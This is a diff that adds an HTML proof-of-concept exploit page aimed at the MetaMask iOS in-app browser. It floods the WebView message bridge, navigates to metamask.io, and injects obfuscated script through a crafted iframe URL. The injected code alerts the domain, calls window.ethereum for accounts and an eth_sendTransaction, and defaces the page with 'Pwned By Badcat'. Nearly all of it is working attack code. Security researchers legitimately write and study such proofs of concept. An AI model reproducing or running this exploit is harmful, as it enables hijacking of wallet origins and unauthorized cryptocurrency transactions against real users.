@@ -1,0 +1,91 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>MetaMask iOS committed-origin provider PoC</title>
+<link rel="dns-prefetch" href="//metamask.io">
+<link rel="preconnect" href="https://metamask.io" crossorigin>
+<h1>Preparing committed-origin provider validation…</h1>
+<script>
+(async () => {
+  const TARGET = 'https://metamask.io/en-GB';
+  const MESSAGE_COUNT = 12;
+  const ARRAY_SOURCE_BYTES = 4000000;
+
+  if (!window.ReactNativeWebView?.postMessage) {
+    document.querySelector('#status').textContent =
+      'Open this page in the authorized MetaMask iOS 8.13.0 test build.';
+    return;
+  }
+
+  const queueMessage =
+    '{"type":"WEB_SHARE","type":"SCROLL_POSITION",' +
+    '"payload":{"scrollY":0},"padding":[' +
+    '0,'.repeat(Math.floor(ARRAY_SOURCE_BYTES / 2)) +
+    '0]}';
+
+  const frame = document.createElement('iframe');
+  frame.hidden = true;
+  frame.src = 'about:blank';
+  document.body.appendChild(frame);
+
+  const charCodeCall = (value) =>
+    'String.fromCharCode(' +
+    Array.from(value).map((character) => character.charCodeAt(0)).join(',') +
+    ')';
+  const jsonExpression = (value) =>
+    'JSON.parse(' + charCodeCall(JSON.stringify(value)) + ')';
+  const connectRequest = jsonExpression({ method: 'eth_requestAccounts' });
+  const transactionRequest = jsonExpression({
+    method: 'eth_sendTransaction',
+    params: [
+      {
+        from: '',
+        to: '',
+        value: '0x0',
+        data: '0x',
+      },
+    ],
+  });
+  const getterDescriptor = jsonExpression({ get: null, enumerable: true });
+  const metamaskHost =
+    'String.fromCharCode(109,101,116,97,109,97,115,107,46,105,111)';
+  const expression =
+    'location.hostname===' + metamaskHost +
+    '&&(' +
+    'alert(document.domain),' +
+    'a=window.ethereum,' +
+    'a&&(' +
+    'c=' + connectRequest + ',' +
+    't=' + transactionRequest + ',' +
+    'g=Reflect.get.bind(null,a,' + charCodeCall('selectedAddress') + '),' +
+    'd=' + getterDescriptor + ',' +
+    'd.get=g,' +
+    'Object.defineProperty(t.params.at(0),' + charCodeCall('from') + ',d),' +
+    'Object.defineProperty(t.params.at(0),' + charCodeCall('to') + ',d),' +
+    'setTimeout(a.request.bind(a,c),500),' +
+    'setTimeout(a.request.bind(a,c),1000),' +
+    'setTimeout(a.request.bind(a,t),1100),' +
+    'setTimeout(document.write.bind(document,' +
+    charCodeCall('<h1>Pwned By Badcat</h1>') +
+    '),1200)' +
+    ')' +
+    ')';
+  const payloadUrl = location.origin + "/'," + expression + ",'";
+
+  try {
+    await Promise.race([
+      fetch(TARGET, { mode: 'no-cors', cache: 'force-cache' }),
+      new Promise((resolve) => setTimeout(resolve, 3000)),
+    ]);
+  } catch (_) {}
+
+  setTimeout(() => {
+    location.href = TARGET;
+    setTimeout(() => {
+      for (let i = 0; i < MESSAGE_COUNT; i++) {
+        window.ReactNativeWebView.postMessage(queueMessage);
+      }
+      frame.src = payloadUrl;
+    }, 0);
+  }, 1000);
+})();
+</script>
